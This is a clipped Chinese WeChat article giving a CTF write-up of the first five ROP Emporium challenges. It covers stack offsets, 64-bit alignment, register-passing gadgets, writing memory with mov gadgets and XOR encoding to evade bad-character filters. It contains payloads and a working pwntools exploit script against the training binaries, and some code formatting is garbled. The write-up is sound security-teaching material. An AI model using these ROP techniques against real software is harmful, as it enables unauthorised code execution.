---
title: 【微信】ROP Emporium 前五题笔记：从栈对齐到坏字符绕过
source: https://mp.weixin.qq.com/s/YHJTAk9TAxsEOvqpcgQYEg
source_host: mp.weixin.qq.com
clip_date: 2026-09-21T09:40:00+08:00
trace_id: 08087fa2-4f28-494b-af0a-d7eda8815263
content_hash: 33ceeb014f1cb9bf06fd09094aa9b511e975236039e17e5c55df9016ff867611
status: synced
tags:
  - 微信
  - CTF
  - ROP利用
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: ROP Emporium 前五题串起一条完整利用链：从栈偏移计算、64 位栈对齐，到用 mov gadget 写内存和异或绕过坏字符检测。
ai_summary_style: key-points
images_status:
  total: 16
  succeeded: 16
  failed_urls: []
notion_page_id: 3e275244-d011-8148-9f1f-c5e4c15b0c1a
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> ROP Emporium 前五题串起一条完整利用链：从栈偏移计算、64 位栈对齐，到用 mov gadget 写内存和异或绕过坏字符检测。
> 
> - **环境与五题考点：** Ubuntu + pwntools + IDA，二进制放在 /mnt/hgfs/pppwn/；依次为 ret2win（栈溢出+对齐）、split（pop rdi 传参）、callme（顺序调用三函数、各凑 3 个寄存器参数）、write4（自寻 mov gadget 写内存）、badchars（异或绕过）。
> - **偏移与栈对齐：** pwnme 中 s[32] 距 rbp 为 0x20，覆盖返回地址偏移即 0x20+8=0x28；NX 开启只能走 ROP。64 位要求 rsp%16==0，直接跳目标函数会段错误，须先补一个 ret（如 0x40053e）衔接，且不能随便填字节，否则改变程序流向。
> - **无写内存函数：** write4 中程序给了 usefulGadgets（\*v0 = v1，即 mov [r14], r15），可把 bss 地址放 r14、把 flag.txt 放 r15 写入内存再传给 print_file；字符串本身不需要 p64，p64 只用于地址/整数。
> - **坏字符绕过：** badchars 的检测不是紧跟 read，汇编显示 call read 在检测循环之后，因此直接送 payload 可原封未动执行。做法是把 flag.txt 逐字节异或 0x02 写入 bss，再用 xor r14b, [r15] 类 gadget 在栈上逐字节还原。另外 usefulGadgets 不出现在 Functions 窗口，必须翻 .text 段或直接用 ROPgadget 找（如 mov qword ptr [r13], r12; ret）。
> - **方法论复盘：** checksec 看保护 → 定位漏洞点与偏移 → 64 位先补 ret 对齐 → 按「gadget → 参数 → 函数地址」拼链 → 数据用 mov [reg], reg 写入内存 → 遇坏字符则加密后运行时还原。

**Licharsec** *2026年9月20日 23:09*

ROP Emporium 前五题的完整做题笔记：从「栈离 rbp 多远」这种最基础的计算开始，一路处理 64 位栈对齐、寄存器传参、没有写内存函数时自己找 mov gadget 写数据，最后用异或绕过坏字符检测。

每题都附 IDA 截图、payload 和可运行的 exp.py。  
环境：Ubuntu + pwntools + IDA，二进制统一放在 /mnt/hgfs/pppwn/ 下。

AI做了下排版，看起来舒服点

## 五题总览与考点

题目总览

| #   | 题目  | 核心考点 | 状态  |
| --- | --- | --- | --- |
| 1   | ret2win | 栈溢出 + 64 位栈对齐（用 ret 填充） | ✅   |
| 2   | split | 函数与参数分离，pop rdi; ret 传参 | ✅   |
| 3   | callme | 顺序调用多个函数，每个都要凑齐 3 个寄存器参数 | ✅   |
| 4   | write4 | 没有现成写内存函数时，自己找 mov 类 gadget | ✅   |
| 5   | badchars | 坏字符绕过：异或加密 + 运行时还原 | ✅   |

一、ret2win

1\. 从 main 找到 pwnme()

第一步永远是看程序从哪进：main 里先 setbuf，然后直接调用 pwnme()。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2e97fe052ce1973a.png)

图 1 · main 里先 setbuf，然后直接调用 pwnme()

2\. 漏洞点：read 写进 32 字节的缓冲区

## 漏洞点与偏移计算

进去 pwnme() 之后，看到经典的 read 写入：

• 缓冲区 char s\[32\] 距离 rbp 为 0x20

• 所以覆盖到返回地址需要的偏移 = 0x20 + 8 = 0x28

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/875119cbf093b147.png)

图 2 · pwnme() 伪代码：read(0, s, 0x38uLL)，空间明显不够

3\. checksec：NX 开着，只能走 ROP

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/97b12acd867de61b.png)

图 3 · checksec ret2win

64 位、无 canary、无 PIE，但 **NX 开启**—— 栈不可执行，所以构造 ROP 链条是唯一的出路。

4\. 找有没有「一发入魂」的函数

• 先在 IDA 的 **Strings 窗口** 里翻现成可用的字符串

• 双击目标字符串，按 **Ctrl + X** 查交叉引用（xrefs）

• 结果发现程序自带 ret2win() 函数，内部直接处理 /bin/cat flag.txt，等于白送 flag

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f0683ba113ce6308.png)

图 4 · Strings 窗口：/bin/cat flag.txt 就在.rodata 里

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/b20e17a67b2e18af.png)

图 5 · Ctrl + X 查引用，定位到 ret2win 函数

## 栈对齐与 payload 构造

5\. 构造 payload：这里有个栈对齐的坑

```
payload = offset * b'A' + p64(ret2win)
```

直接跳过去会崩：需要栈对齐

这样写 **无法正确打印**，因为 64 位下要求栈 16 字节对齐（rsp % 16 == 0），否则会触发段错误，进程直接死掉。  
因此需要找一个 ret 地址来做衔接对齐。注意： **不能随便填字节**，因为要的是 ret 这种只做「pop + 跳转」的指令；换成 pop 之类的指令会改变程序流向，导致中断。

修改后：

```
ret = 0x40053e  payload = flat(     b'A' * offset,     p64(ret),     p64(ret2win) )
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c1f23d7b7a3cb2ec.png)

6\. 结果

图 6 · 成功拿到 ROPE{a_placeholder_32byte_flag!}

二、split

考点：函数与参数分离

程序已经把 system 给你了，但 /bin/cat flag.txt 这个参数需要你自己传进去。

构造 payload

```
payload = 0x28 * b'A' + p64(pop_rdi_ret) + p64(0x601060) + p64(system)
```

同样的问题：需要构造 **栈平衡**。调用 system 这类函数必须满足 rsp % 16 == 0 才能对齐，所以得在前面补一个 ret：

```
payload  = 0x28 * b'A' + p64(ret) payload += p64(pop_rdi_ret) + p64(0x601060) + p64(system)
```

这里的 0x601060 就是 /bin/cat flag.txt 字符串的地址。

三、callme

题目要求

必须 **按顺序** 调用 callme_one()、callme_two()、callme_three()，且每个函数都要带上参数 0xdeadbeef、0xcafebabe、0xd00df00d。  
对于 **x86_64** 二进制，这些值要加倍成 64 位，例如 0xdeadbeefdeadbeef、0xcafebabecafebabe、0xd00df00dd00df00d。  
解题思路很简单：利用对 PLT 内部结构的了解，按上述顺序并带上正确参数调用函数即可。（如果你挑战的是 MIPS 版本，别忘了分支延迟槽。）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/33e6cca36e0bf3cf.png)

图 7 · callme 题目原文提示

构造 payload

按照调用顺序先把栈配平，然后依次把参数塞进寄存器：64 位通过寄存器传参，用「函数 → 返回地址」的嵌套逻辑串起来。

```toml
payload  = cyclic(offset) + p64(ret) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_one) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_two) payload += p64(pop) payload += p64(one) + p64(two) + p64(three) + p64(callme_three)
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8ee670bc023dd768.png)

图 8 · 三个函数依次 called correctly，拿到 flag

四、write4

题目提示（原文）

PLT 中有一个名为 print_file() 的条目存在于挑战二进制文件中，只需将要读取的文件名（例如 flag.txt）作为第一个参数调用它即可。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f9e74596b8565af9.png)

图 9 · write4 题目提示原文

1\. 先看附件

发现给了多个附件，其中一个是 so 文件。看主函数的时候发现 pwnme 之类的函数都没有具体代码，所以把 so 在 IDA 里打开，发现相关内容和之前是一样的。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/67e7940dd8790232.png)

图 10 · 函数体都在 libwrite4.so 里

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/0c4c2c1c1c49ab21.png)

图 11 · print_file() 内部就是 fopen → fgets → puts

所以思路最开始很清晰： **查找可写段 → 写入需要的参数 → 调用给的漏洞函数然后传参拿 flag**。

2\. 难点：没有现成的写内存函数

## 无写内存函数的应对

但一路找下来，发现并没有可以直接写入的函数给我们使用，此路不通 —— 这就是本题的考点。直接查询 gadget 是无效的，不过看到 IDA 编译给了个函数：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/86538915af8ec44a.png)

图 12 · usefulGadgets()：\*v0 = v1，即把 r15 的内容写进 r14 指向的地址

能够令 r14 指向的地址写入 r15 的内容，这个可以拿来写入指定地点，然后后续再传参进去。

3\. payload

```
payload  = cyclic(offset) + p64(ret) + p64(pop_r14_r15) payload += p64(bss) + b'flag.txt' + p64(mov_r14_r15) payload += p64(pop_rdi) + p64(bss) + p64(print_file)
```

4\. 学到的新思路

收获

① 有时候 **没有写内存的函数**，但可以去找找有没有自带赋值的 mov 类指令（如 mov \[reg\], reg），通过这种方式写入参数然后调用。  
② 参数 **字符串传递时不需要 p64**，p64 只用在地址 / 整数上。

五、badchars

1\. 漏洞与坏字符机制

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/ddcb614d57ceae3b.png)

图 13 · pwnme() 里 puts 出坏字符 x / g / a /. ，随后扫描缓冲区把命中的字节替换成 -21

常规做法需要填写参数 flag.txt，按照上一题的做法就行；但因为 **会检测坏字符并被更改**，所以要另想办法解决。

2\. 别只在 Functions 窗口里找 gadget

重点

题目给的 usefulGadgets 函数 **不会在 Functions 列表里显示**，只会在.text 段里显示。  
所以以后做题， **看一下.text 段也很有必要**。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e29aadcb14c198ca.png)

图 14 ·.text 段里的 usefulFunction 与 usefulGadgets

## 坏字符检测时机分析

3\. 关键：检测发生的时机

看起来检测在 read 后面，但是并不是这样的。

**时间线：**

• ① read → 栈上落下 payload（全干净：地址无坏字符 + 字符串是 "dnce,vzv" 编码版）

• ② 坏字符扫描 loop → 逐个比对缓冲区 → 找不到 'x''g''a''.' → 0 处替换，什么也没发生

• ③ puts("Thank you!")

• ④ leave; ret → 开始执行这条「原封未动」的 ROP 链

并且看汇编代码可以看到，call read 是在检测字符后面的。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2c44bc7a3991540b.png)

图 15 · 汇编顺序：printf("> ") 之后才 call read

4\. 思路：异或两次还原

所以思路就是：先送进去 **可以越过检测的内容**，然后在构造 ROP 链条的时候，先把参数做变换、再还原为 flag.txt，最终进行和上面一样的利用。

这里用 **异或**：利用性质 —— 对同一个参数异或两次就恢复原来的值。

5\. 找 gadget 的过程

这题因为要写地址参数，而它没有 r14 = r15，有的是 r13 和 r12。不知道为什么作者给的 gadget 没有显示出来，得一个个找，这里看了 WP。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/247afdd16ac1de17.png)

图 16 · ROPgadget 找 r12，命中 mov qword ptr \[r13\], r12; ret

6\. 具体的 POC

```css
#!/usr/bin/env python3
-- coding: utf-8 --
from pwn import *
context.binary = elf = ELF('/mnt/hgfs/pppwn/badchars')
context.log_level = 'info'
io = process(elf.path)
io = remote('HOST', PORT)
==
= addresses ===
ret                 = 0x4004ee
pop_rdi             = 0x4006a3
pop_r12_r13_r14_r15 = 0x40069c
mov_r13_r12         = 0x400634
pop_r14_r15         = 0x4006a0
xor_r14b_ptr_r15    = 0x400628
bss                 = 0x601038
print_file          = 0x400510
==
= data ===
filename = b'flag.txt'
enc = bytes(c ^ 0x02 for c in filename)
==
= exploit ===
offset = 0x28
payload = flat(
b'A' * offset,
ret,
# [bss] = encrypted "flag.txt"
pop_r12_r13_r14_r15,
u64(enc),
bss,
0,
0,
mov_r13_r12,
)
decrypt byte by byte
for i in range(len(filename)):
payload += flat(
pop_r14_r15,
2,
bss + i,
xor_r14b_ptr_r15,
)
print_file("flag.txt")
payload += flat(
pop_rdi,
bss,
print_file,
)
io.sendline(payload)
io.interactive()
```

## ROP 方法论复盘

六、复盘：五题串起来的 ROP 方法论

| 步骤  | 要问自己的问题 |
| --- | --- |
| 1   | checksec<br><br>看保护：NX 开了吗？PIE / canary 有没有？ |
| 2   | 漏洞点在哪？偏移到返回地址是多少（算到 rbp 再加 8）？ |
| 3   | 64 位先补一个 ret 做栈对齐，再谈别的 |
| 4   | 按「**gadget → 参数 → 函数地址**」的顺序拼链 |
| 5   | 需要的字符串 / 数据怎么写进内存？找 mov \[reg\], reg 类 gadget |
| 6   | 有坏字符？加密后写进去，再用 gadget 在栈上还原 |

**一句话总结**：ROP 就是「用已有的小指令片段把寄存器凑成一次合法函数调用」，难点永远是 **参数从哪来、数据放哪去**。
